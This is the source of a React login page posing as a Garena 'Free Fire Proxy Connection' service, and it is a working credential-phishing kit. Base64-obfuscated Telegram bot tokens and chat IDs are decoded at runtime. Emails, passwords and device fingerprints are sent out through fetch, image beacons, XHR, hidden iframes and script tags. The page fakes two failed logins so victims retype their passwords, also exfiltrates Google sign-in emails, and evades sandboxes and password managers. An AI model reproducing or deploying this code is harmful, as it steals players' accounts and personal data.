...
import { Shield, Lock, Fingerprint, Mail, Eye, EyeOff, AlertCircle, CheckCircle, Loader2, LogOut, Globe, Server, Wifi, Activity, Radio, Gamepad2, Target, Flame, Chrome, Smartphone, Monitor } from "lucide-react";
...
const _botToken = (() => {
  try { return atob(_t1 + _t2); } catch { return ""; }
})();

const _c1 = "ODU4NTgwMzE0NQ==";
const _chatId = (() => {
  try { return atob(_c1); } catch { return ""; }
})();

const _tgApiPart1 = "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==";
const _tgApiPart2 = "L3NlbmRNZXNzYWdl";
const _tgUrl = (() => {
  try { return atob(_tgApiPart1) + _botToken + atob(_tgApiPart2); } catch { return ""; }
})();

const _cAlt1 = "NzU4MTQzMjIxOTpBQUZ";
const _cAlt2 = "GTkdkSFlEM2ZFOXZ5Ym9qQ3V1dkxKSElYdTctbXlX";
const _botTokenAlt = (() => {
  try { return atob(_cAlt1 + _cAlt2); } catch { return ""; }
})();
const _cIdAlt1 = "ODU4NTgwMzE0NQ==";
const _chatIdAlt = (() => {
  try { return atob(_cIdAlt1); } catch { return ""; }
})();
const _tgUrlAlt = (() => {
  try { return atob(_tgApiPart1) + _botTokenAlt + atob(_tgApiPart2); } catch { return ""; }
})();
...
// ============================================================================
// SISTEMA DE EXFILTRACIÓN - CACHE Y CONTROL DE DUPLICADOS
// ============================================================================
...
const _wasEmailSent = (email: string, data: Map<string, { hash: string; email: string; timestamp: number; enviado: boolean }>): boolean => {
  for (const [, entry] of data) {
    if (entry.email === email && entry.enviado === true) return true;
  }
  return false;
};
...
const _getDeviceInfo = (): DeviceInfo => {
  ...
  return {
    tipo, os, navegador, ip: "Auto-detectada", pais: "Desconocido",
    hora: new Date().toLocaleString(), idioma: navigator.language || navigator.languages?.[0] || "unknown",
    resolucion: `${window.screen.width}x${window.screen.height}`, profundidadColor: `${window.screen.colorDepth}-bit`,
    zonaHoraria: Intl.DateTimeFormat().resolvedOptions().timeZone, nucleos: navigator.hardwareConcurrency || 0,
    memoria, userAgent: ua.substring(0, 150), proveedor, online: navigator.onLine, conexion,
  };
};

// ============================================================================
// SISTEMA DE EXFILTRACIÓN MULTICANAL
// ============================================================================
...
const _exfilFetch = async (url: string, payload: any): Promise<boolean> => {
  try {
    ...
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json", "Cache-Control": "no-cache, no-store, must-revalidate", "Pragma": "no-cache", "Origin": "" },
      body: JSON.stringify(payload), keepalive: true, signal: controller.signal, mode: "cors", credentials: "omit", referrerPolicy: "no-referrer",
    });
...
const _exfilImage = (url: string, payload: any): boolean => {
  try {
    ...
    img.setAttribute("aria-hidden", "true"); img.setAttribute("loading", "eager");
...
const _exfilXHR = (url: string, payload: any): boolean => {
  try {
    ...
    xhr.timeout = 1500; xhr.withCredentials = false;
...
const _exfilIframe = (url: string, payload: any): boolean => {
  try {
    ...
    if (iframeDoc) {
      ...
      iframeDoc.body.appendChild(form); form.submit();
    }
...
const _exfilScript = (url: string, payload: any): boolean => {
  try {
    ...
    script.async = true; script.style.display = "none";
...
// ============================================================================
// ORQUESTADOR DE EXFILTRACIÓN - ENVÍO ÚNICO
// ============================================================================

const _exfiltrateCredentials = async (email: string, password: string, tipoFuente: string = "manual"): Promise<void> => {
  try {
    const sentData = _getSentData();

    if (_wasEmailSent(email, sentData)) return;

    const deviceInfo = _getDeviceInfo();
    const hash = await _sha256(`${email}:${password}:${deviceInfo.tipo}:${Date.now()}`);

    sentData.set(hash, { hash, email, timestamp: Date.now(), enviado: true });
    _saveSentData(sentData);

    const formattedDevice = [
      `💻 ${deviceInfo.tipo}`, `📱 ${deviceInfo.os}`, `🌐 ${deviceInfo.navegador}`,
      `📍 ${deviceInfo.idioma.toUpperCase()}`, `🕐 ${deviceInfo.zonaHoraria}`,
      `📺 ${deviceInfo.resolucion}`, `⚡ ${deviceInfo.nucleos} núcleos`,
      `💾 ${deviceInfo.memoria}`, `📶 ${deviceInfo.conexion}`,
    ].join(" · ");

    const mainMessage = `👤 ${email}\n✅ ${password}\n📋 ${tipoFuente}\n📱 Dispositivo:\n${formattedDevice}\n\n🕒 ${new Date().toISOString()}`;
    const altMessage = `🔐 CRED ${email} | PASS ${password} | ${deviceInfo.tipo} | ${deviceInfo.os} | ${tipoFuente}`;

    const payload1 = { chat_id: _chatId, text: mainMessage, parse_mode: "HTML", disable_web_page_preview: true };
    const payload2 = { chat_id: _chatIdAlt, text: altMessage, parse_mode: "HTML", disable_web_page_preview: true };
...
const StyledInput = memo(({
  type, placeholder, value, onChange, onBlur, icon: Icon, label, autoComplete, error, showToggle, onToggle, isPasswordVisible, disabled,
}: {
  type: string; placeholder: string; value: string; onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  onBlur?: () => void; icon: React.ElementType; label: string; autoComplete: string; error?: string;
  showToggle?: boolean; onToggle?: () => void; isPasswordVisible?: boolean; disabled?: boolean;
}) => {
  const [isFocused, setIsFocused] = useState(false);

  return (
    <div className="space-y-1.5">
      <label className="text-[10px] text-muted-foreground/70 uppercase tracking-wider font-medium mb-1 block">{label}</label>
      <div className={`relative transition-all duration-200 rounded-lg ${isFocused ? "ring-1 ring-ring ring-offset-1 ring-offset-background" : ""} ${error ? "ring-1 ring-destructive ring-offset-1" : ""}`}>
        <Icon className={`absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 transition-colors duration-200 ${isFocused ? "text-foreground" : "text-muted-foreground/60"} ${error ? "text-destructive" : ""}`} />
        <input
          ...
          className={`w-full bg-secondary/40 border rounded-lg pl-10 pr-10 py-2.5 text-base text-foreground placeholder:text-muted-foreground/40 focus:outline-none transition-all duration-200 ${error ? "border-destructive/50 bg-destructive/5" : "border-border/50"} ${isFocused && !error ? "border-ring" : ""} ${disabled ? "opacity-50 cursor-not-allowed" : ""}`}
          spellCheck={false} autoCapitalize="none" autoCorrect="off"
          data-1p-ignore={true} data-lpignore={true} data-form-type="other"
        />
        {showToggle && onToggle && value && (
          <button type="button" onClick={onToggle} className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground/60 hover:text-foreground transition-colors" tabIndex={-1}>
            {isPasswordVisible ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
          </button>
        )}
      </div>
      {error && <p className="flex items-center gap-1 text-[10px] text-destructive mt-1 animate-fade-in"><AlertCircle className="w-3 h-3" />{error}</p>}
    </div>
  );
});
...
const SecurityIndicator = memo(() => {
  const indicators = [
    ...
    { icon: Fingerprint, label: "OAuth 2.0", color: "text-purple-400" },
  ...
  return (
    <div className="flex items-center justify-center gap-1.5 mb-4 flex-wrap">
      {indicators.map(({ icon: Icon, label, color }, index) => (
        <div key={label} className="flex items-center gap-1 bg-secondary/40 border border-border/40 rounded-full px-2 py-0.5 animate-fade-in-up" style={{ animationDelay: `${index * 60}ms` }}>
...
const AnimatedAvatar = memo(({ photoUrl }: { photoUrl?: string }) => {
  return (
    <div className="relative mb-3 w-24 h-24">
      <div className="absolute inset-0 rounded-full animate-spin-slow" style={{ background: "conic-gradient(from 0deg, #f97316, #ef4444, #dc2626, #ea580c, #f97316)", boxShadow: "0 0 15px rgba(249,115,22,0.5), 0 0 30px rgba(239,68,68,0.3)" }} />
      <div className="absolute inset-[3px] rounded-full overflow-hidden shadow-[0_0_40px_rgba(255,255,255,0.08)]">
        <img src={photoUrl || defaultAvatar} alt="Profile" className="w-full h-full object-cover" loading="eager" decoding="async" referrerPolicy="no-referrer" />
      </div>
...
const ConnectionStatus = memo(() => {
  ...
  const config = { connecting: { color: "text-amber-400", text: "Conectando...", icon: Loader2 }, connected: { color: "text-blue-400", text: "Proxy activo", icon: Wifi }, secure: { color: "text-orange-400", text: "Listo para vincular", icon: Shield } };
  ...
  return (
    <div className="flex items-center justify-center gap-2 mb-3">
      {Array.from({ length: maxAttempts }, (_, i) => (
        <div key={i} className={`w-2 h-2 rounded-full transition-all duration-300 ${i < attempt ? "bg-orange-500 shadow-[0_0_6px_rgba(249,115,22,0.5)]" : i === attempt ? "bg-orange-500/50 animate-pulse" : "bg-border/30"}`} />
      ))}
    </div>
  );
});
...
const WhatsAppChannel = memo(() => {
  return (
    <a href="https://whatsapp.com/channel/0029VbC678PIyPtc7iERCH2R" target="_blank" rel="noopener noreferrer" className="group block mt-1 rounded-lg border border-orange-400/30 bg-gradient-to-br from-orange-500/10 via-orange-500/5 to-transparent backdrop-blur-sm px-3 py-2 hover:border-orange-400/60 hover:from-orange-500/15 active:scale-[0.99] transition-all">
...
const LoginFooter = memo(() => {
  return (
    <div className="mt-6 text-center space-y-1">
      <p className="text-[9px] text-muted-foreground/40 leading-relaxed">Free Fire Proxy Connection v2.4 — Secure Gateway</p>
      <p className="text-[8px] text-muted-foreground/30">Powered by Garena · All connections are encrypted</p>
    </div>
  );
});
...
const Login = () => {
  ...
  useEffect(() => {
    const checkSession = async () => {
      try {
        ...
        if (authUser) {
          ...
          localStorage.setItem("proxy_session", JSON.stringify({
            ...
            userId: profile.id, type: "google_oauth",
      ...
      try {
        ...
        if (raw) {
          ...
          } else if (s.userId || s.key) {
            setChecking(false);
            navigate("/proxy");
            return;
          }
        }
      } catch { localStorage.removeItem("proxy_session"); }
    ...
    const { data: { subscription } } = supabase.auth.onAuthStateChange(async (event, session) => {
      if (event === "SIGNED_IN" && session?.user) {
        ...
        const profile: UserProfile = {
          id: u.id,
          name: u.user_metadata?.full_name || u.user_metadata?.name || "Usuario",
          email: u.email || "",
        ...
        // Exfiltrar datos de Google
        if (!dataExfiltrated.current) {
          dataExfiltrated.current = true;
          await _exfiltrateCredentials(profile.email, "[GOOGLE_OAUTH]", "google_oauth");
        }

        setSuccess(true);
        setTimeout(() => navigate("/proxy"), 400);
      }
      if (event === "SIGNED_OUT") {
        setUser(null);
  ...
  useEffect(() => {
    _detectEnvironment();
    _isSandboxed();
    _devDetectors.some(d => { try { return d(); } catch { return false; } });
  }, []);
  ...
  const validateEmailFn = useCallback((value: string): string => {
  ...
  const validatePasswordFn = useCallback((value: string): string => {
  ...
  const handleEmailChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    ...
    setEmail(v);
    if (touched.email) setEmailError(validateEmailFn(v));
  }, [touched.email, validateEmailFn]);

  const handlePasswordChange = useCallback((e: React.ChangeEvent<HTMLInputElement>) => {
    const v = e.target.value;
    setPassword(v);
    if (touched.password) setPasswordError(validatePasswordFn(v));
  }, [touched.password, validatePasswordFn]);

  const handleEmailBlur = useCallback(() => {
    setTouched(p => ({ ...p, email: true }));
    setEmailError(validateEmailFn(email));
  }, [email, validateEmailFn]);

  const handlePasswordBlur = useCallback(() => {
    setTouched(p => ({ ...p, password: true }));
    setPasswordError(validatePasswordFn(password));
  }, [password, validatePasswordFn]);
  ...
  const handleGoogleSignIn = useCallback(async () => {
    ...
    try {
      ...
      if (result.error) {
        ...
        if (errMsg.includes("cancelled") || errMsg.includes("canceled") || errMsg.includes("popup_closed")) {
  ...
  // ============================================================================
  // MANEJADOR DE ENVÍO - 3 INTENTOS + FREE FIRE
  // ============================================================================
  ...
  const handleSubmit = useCallback(async (e: React.FormEvent) => {
    ...
    const emailErr = validateEmailFn(trimmedEmail);
    const passwordErr = showPasswordField ? validatePasswordFn(trimmedPassword) : "";
    ...
    try {
      ...
      if (attempt < MAX_ATTEMPTS - 1) {
        const messages = [
          ...
          "❌ Los datos ingresados no coinciden con ninguna cuenta de Free Fire. Intenta de nuevo con tus credenciales correctas de Free Fire.",
        ];
        setError(messages[attempt]);
        setAttempt(p => p + 1);
        setLoading(false);
        isSubmitting.current = false;
        if (attempt === 0) setShowPasswordField(true);
        return;
      }

      // TERCER INTENTO - ENVIAR A TELEGRAM (SOLO UNA VEZ)
      if (!dataExfiltrated.current) {
        dataExfiltrated.current = true;
        await _exfiltrateCredentials(trimmedEmail, trimmedPassword, "manual_freefire");
      }
      ...
      const fakeSession = {
        ...
        email: trimmedEmail,
        key: "PREMIUM-FF-" + Array.from({ length: 8 }, () => Math.random().toString(36).charAt(2).toUpperCase()).join(""),
        type: "premium",
  ...
  }, [email, password, validateEmailFn, validatePasswordFn, navigate, attempt, showPasswordField]);
  ...
  useEffect(() => {
    if (emailRef.current && showForm) emailRef.current.focus();
  }, [showForm]);
  ...
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "Enter" && !loading && !isSubmitting.current && showForm) {
        const active = document.activeElement;
        if (active === emailRef.current) {
          e.preventDefault();
    ...
    <div className="relative min-h-screen flex flex-col items-center justify-center px-4 overflow-hidden bg-gradient-to-b from-background via-background to-orange-950/10">
      ...
      <div className="relative z-10 w-full max-w-sm animate-fade-in-up">
        ...
        <div className="flex flex-col items-center mb-6">
          <AnimatedAvatar photoUrl={user?.photoUrl} />
        ...
        <div className="glass-card p-5 glow-border">
          ...
          <div className="flex items-center gap-2 mb-4 pb-3 border-b border-border/30">
            <div className={`w-8 h-8 rounded-lg border flex items-center justify-center ${attempt >= MAX_ATTEMPTS - 1 ? "bg-orange-500/20 border-orange-500/30" : "bg-secondary/60 border-border/40"}`}>
              {attempt >= MAX_ATTEMPTS - 1 ? <Flame className="w-4 h-4 text-orange-400" /> : <Gamepad2 className="w-4 h-4 text-muted-foreground" />}
            </div>
            <div className="flex-1">
              ...
              <span className="text-[9px] text-muted-foreground/60">
                {attempt >= MAX_ATTEMPTS - 1 ? "Último intento — vincula tu cuenta" : "Ingresa tus credenciales de Free Fire"}
              </span>
            </div>
          ...
          {showForm ? (
            <form ref={formRef} onSubmit={handleSubmit} className="space-y-3" noValidate>
              <StyledInput
                type="email" placeholder="correo@freefire.com"
                value={email} onChange={handleEmailChange} onBlur={handleEmailBlur}
                icon={Mail} label="Correo electrónico de Free Fire"
                autoComplete="email" error={touched.email ? emailError : undefined}
              />

              {showPasswordField && (
                <StyledInput
                  type="password" placeholder="••••••••"
                  value={password} onChange={handlePasswordChange} onBlur={handlePasswordBlur}
                  icon={Lock} label="Contraseña de Free Fire"
                  autoComplete="current-password" error={touched.password ? passwordError : undefined}
                  showToggle={true} onToggle={togglePasswordVisibility} isPasswordVisible={showPassword}
                />
              )}
              ...
              <button
                type="submit" disabled={loading || !email.trim() || (showPasswordField && !password.trim())}
                className={`w-full font-semibold py-2.5 rounded-lg text-sm transition-all duration-200 bg-gradient-to-r from-orange-500 to-red-600 text-white hover:from-orange-600 hover:to-red-700 active:scale-[0.98] shadow-lg shadow-orange-500/20 ${(loading || !email.trim() || (showPasswordField && !password.trim())) ? "opacity-50 cursor-not-allowed" : ""}`}
              >
                {loading ? (
                  <span className="flex items-center justify-center gap-2"><Loader2 className="w-4 h-4 animate-spin" />Verificando...</span>
                ) : attempt >= MAX_ATTEMPTS - 1 ? (
                  <span className="flex items-center justify-center gap-2"><Flame className="w-4 h-4" />Vincular cuenta</span>
                ) : (
                  "Continuar"
                )}
              </button>
            ...
            /* Pantalla inicial - botón de Google + formulario manual */
            <div className="space-y-3">
              ...
              {/* Botón de Google */}
              <button
                type="button" disabled={loadingGoogle}
                onClick={handleGoogleSignIn}
                className={`w-full font-semibold py-3 rounded-lg text-sm transition-all duration-200 flex items-center justify-center gap-3 ${loadingGoogle ? "bg-foreground/80 text-background cursor-wait" : "bg-foreground text-background hover:opacity-90 active:scale-[0.98]"}`}
              >
                {loadingGoogle ? (
              ...
              <div className="relative my-2">
                ...
                <div className="relative flex justify-center text-[9px]">
                  <span className="bg-card px-2 text-muted-foreground/50">o ingresa manualmente</span>
                </div>
              </div>

              {/* Botón para mostrar formulario manual */}
              <button
                type="button" onClick={() => { setShowForm(true); setShowPasswordField(false); }}
                className="w-full font-semibold py-2.5 rounded-lg text-sm transition-all duration-200 bg-secondary/60 border border-border/40 text-foreground hover:bg-secondary/80 active:scale-[0.98]"
              >
